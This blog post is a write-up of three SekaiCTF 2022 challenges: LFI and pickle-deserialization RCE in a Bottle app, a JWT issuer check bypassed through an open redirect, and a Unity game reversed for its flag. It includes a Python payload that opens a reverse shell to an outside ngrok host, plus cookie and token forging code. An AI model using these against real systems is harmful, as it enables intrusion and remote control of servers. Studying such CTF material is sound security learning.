---
layout: post
title: SekaiCTF 2022 Writeup
tags: [ctf, ctf writeup]
---

*Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.*

This is my writeup to web challenges "[Bottle Poem](https://ctf.sekai.team/challenges#Bottle-Poem-29)", "[Issues](https://ctf.sekai.team/challenges#Issues-33)" and reverse challenge "Perfect Match X-treme" in [SekaiCTF 2022](https://ctf.sekai.team/). I started doing the CTF when I joined a team halfway through the CTF. The exploits and skills involved in these 3 challenges in this writeup includes local file inclusion (LFI), unsafe deserialization and remote code execution (RCE), improper use of JWKS, open redirect, Unity game reversing and general/reversing tooling.

On this page:

- [Bottle Poem (Web) writeup](#bottle-poem-web)
- [Issues (Web) writeup](#issues-web)
- [Perfect Match X-treme (Reverse) writeup](#perfect-match-x-treme)

## Bottle Poem (Web)

![Bottle Poem index page.](/assets/image/sekaictf-2022-writeup/bottle-poem-index.png)

In the first webpage of the challenge, there are three links to "poems in the Bottle".

![First poem in the Bottle.](/assets/image/sekaictf-2022-writeup/bottle-poem-spring.png)

Upon clicking the link, we noticed the value of the query parameter `id` appears to be the filename of the file to be shown. For example, the link "Spring" links to `http://bottle-poem.ctf.sekai.team/show?id=spring.txt`.

### Local File Inclusion and Leaking Source Code

Filename being passed into as query parameter smells like the recipe for local file inclusion (LFI). Though the challenge description states the flag is an executable, and we cannot just make the webpage to include and display the flag, we however can get more information exploiting LFI. 

To confirm LFI, we tried to pass `/etc/passwd` as value of `id` parameter, and we get content of `/etc/passwd` being returned.

![/etc/passwd leaked.](/assets/image/sekaictf-2022-writeup/bottle-poem-passwd.png)

From the HTTP header `server: WSGIServer/0.2 CPython/3.8.12`, I can tell the backend is in Python. Many Python webapps in CTFs would have a `app.py` file as the entry point of the apps, so I tried to see if the file exists in the directory of the poem files or the parent directory, which hopefully to be the webapp's root.

When I tried `../app.py`, instead of showing "No This Poems", it showed "No!!!!", which means `../app.py` file likely exists and the author prevents us from seeing it.

![../app.py but we cannot see it.](/assets/image/sekaictf-2022-writeup/bottle-poem-app-py-no.png)

Trying with several different "files" known to normally exist on Linux, `/proc/self/cmdline` gave me the command runs the webapp `python3 -u /app/app.py`. This gave me the absolute location of `app.py` file.

`/app/app.py` worked around the restrictions when using relevant path and leaked the source code of the webapp.

![app.py](/assets/image/sekaictf-2022-writeup/bottle-poem-app-py.png)

From the source code, I can see the app used Bottle web framework.

### Admin? And Other Distractions

In the function for `/sign`, I can see the if we do not have a session prior we will be assigned a guest session, if we have an admin session, we will have a different template rendered.

Without looking into the templates, I started just obtaining admin session. I leaked the secret for signing the cookies from `/app/config/secret.py`:

```Python
sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
```

I then installed Bottle and used it to serve webpage that sets signed cookie with data `{"name": "admin"}` to obtain the admin cookie:

```Python
from bottle import route, run, request, response

@route('/hello')
def hello():
    session = {"name": "admin"}
    response.set_cookie("name", session, secret="Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu")
    return "Hello World!"

run(host='localhost', port=8080, debug=True)
```

The value of the admin cookie produced is `!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==`. I then set the cookie named `name` as this value, and visited `/sign`, however, the page shown to me was not impressive. It showed me "Hello, you are admin, but it's useless."

I looked around both templates for guest and admin, which are located in `/app/views/`, and named `guest.html` and `admin.html` respectively. The template files are just HTML with template syntax tags. The two lines from those files appear the most interesting as they contains template variable tags:

{% raw %}
```
Hello {{{name}}, what r u doing????
Hello, you are {{name}}, but it’s useless.
```
{% endraw %}

I wondered if any server-side template injection (SSTI) possible here. However, it appeared the `name` variable passed into the template is from the session cookie's `name`, and the templates only renders if the value to be "guest" or "admin", and any other values would not work.

### Finding the Exploit

Bottle is a rather small framework, when I was looking into [the source code of Bottle](https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py) to figure out how to forge the admin cookie, I noticed a deprecate warning at [line 1850](https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py#L1850) about pickling of arbitrary objects into cookies. I did some search and find this rather old [issue](https://github.com/bottlepy/bottle/issues/900) from 2016 regarding the security of using pickle to deserialize cookie values, which causes remote code execution (RCE).

Our team crafted a similar payload as the cookie value based on this exploit and got the flag:

```
import pickle
import base64
import os
import hmac
import hashlib

class RCE:
    def __reduce__(self):
        cmd = """
            python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",16526));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
        """
        return os.system, (cmd,)

def gen_cookie(payload):
    b64pld = base64.b64encode(payload)
    signature = base64.b64encode(
        hmac.new(
            b"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu", b64pld, hashlib.md5
        ).digest()
    )
    return b'"!' + signature + b"?" + b64pld + b'"'

if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(gen_cookie(pickled))
```

### Bottle Poem Conclusion

In this challenge we exploited LFI to leak information including the source of the webapp, and use of insecure deprecated features of unsafe deserialization in the framework which leads to RCE.

## Issues (Web)

This challenge has a downloadable, which contains the source of the challenge. Examining the source, it has an `app.py` and an `api.py` file contains the most interesting part of the challenge. In `app.py`, it has a `/.well-known/jwks.json` endpoint which returns a pre-defined JSON Web Key Set (JWKS). The flag is in a text file, and `/api/flag` endpoint would return the content of the file. However, the flag api endpoint requires authorization to access.

Looking into the authorization code, it checks bearer tokens in header. The token is a JSON Web Token (JWT), and the public key used to verify the token is from the issuer defined in JWT token, grabbed with `requests.get(url)`. Thus, we could use our own public and private key pair to sign the JWT, and point the issuer to somewhere we have control thus provides our own public key for the app to verify the token.

Is it that easy though? Before getting the public key, it checks if the issuer is from `localhost:8080` with `urlparse(issuer).netloc`. With this check, we can no longer point the issuer to anything we want other than `localhost:8080`. I tried to exploit `urlparse` to bypass the restriction, however, it did not seem would work (though not relevant, during the research, I learned that `urlparse` has interesting behaviour when returning hostnames e.g. [this report on Python bug tracker](https://bugs.python.org/issue36338), and [Python has this issue as described in this CVE for the Node.js package too](https://security.snyk.io/vuln/SNYK-JS-URLPARSE-2407759)).

When I reviewed the challenge code again, I noticed the `/logout` endpoint has an redirect after clearing the session, which defaults to `home`, however it does not do any check on the `redirect` parameter if given, and would redirect to whatever is passed onto. This is vulnerable to open redirect. I used this open redirect endpoint to bypass the restriction on issuer, crafted issuer `http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&a=`, which results in the app requests JWKS from my own server.

### Crafting the Final Payload

Generate RSA private and public key:

```
openssl genrsa -out rsa.private 512
openssl rsa -in rsa.private -out rsa.public -pubout -outform PEM
```

Make `jwks.json` to be served with HTTP server:

```JSON
{
    "keys": [
        {
            "alg": "RS256",
            "x5c": [
                "<content of public key>"
            ]
        }
    ]
}
```

Generate the admin token:

```Python
import jwt

private_key = open('rsa.private').read()

print(jwt.encode({'user': 'admin'}, private_key, 'RS256', {'issuer': 'http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&a='})
```

The token looks like this:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
```

Request `/api/flag` endpoint with the authorization header using the token:

```
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
```

Get flag `SEKAI{v4l1d4t3_y0ur_i55u3r_plz}`.

### Issues Conclusion

I exploited the use of JWKS and open redirect in the challenge.

## Perfect Match X-treme

This challenge has a downloadable, which contains a Unity game. The game looks similar to Perfect Match minigame in Fall Guys: Ultimate Knockout (https://youtu.be/edifg0uMzxU). The gameplay is to remember the fruits the tiles corresponding to in each round, and stand on the tiles matching the fruit shown on the screen at the end of the round to progress into the next round.

![Challenge screenshot.](/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-game.png)

However, in the third round of the challenge game, it always shows the SekaiCTF logo on the screen, and no tiles matches. Thus, we cannot finish the game through normal gameplay to finish the game.

![Eliminated screen.](/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-eliminated.png)

Examining the files, and reading [some guide](https://github.com/imadr/Unity-game-hacking), I identified `/PerfectMatch_Data/Managed/Assembly-CSharp.dll` would be the interesting file that contains the game's logic (`Assembly-UnityScript.dll` would be interesting too if it exists according to the guide).

The next step is to use decompiler for .NET or Unity. I tried to decompile the DLL file with dotPeak, ILSpy and dnSpyEx, and they all worked. I used primarily [dnSpyEx](https://github.com/dnSpyEx/dnSpy) during this challenge.

Opening the DLL in dnSpyEx, `GameManager` contains the logic of choosing fruits for each round. Browsing around content in the DLL, I find the code for showing the flag is in UI. The screenshot of the content of the decompiled DLL and content of UI is shown below:

![Decompiled Assembly-UnityScript.dll content.](/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-decompile-ui.png)

The flag appeared to be 3 pieces of text putting together, I guessed it could be 3 pieces of strings stored in some data file, which might be `/PerfectMatch_Data/level0`. To check further, I used `grep -r "SEKAI{" .`, and it returned `grep: ./PerfectMatch_Data/level0: binary file matches`. Then I used `strings` to extract the strings of the flag, and find this part of the output looks like the strings for the flag:

```
SEKAI{F4LL_GUY5_
fff?fff?
Qualified!
1LL3G4L}
H3CK_15_
```

Putting the 3 parts together, got the flag `SEKAI{F4LL_GUY5_H3CK_15_1LL3G4L}`.
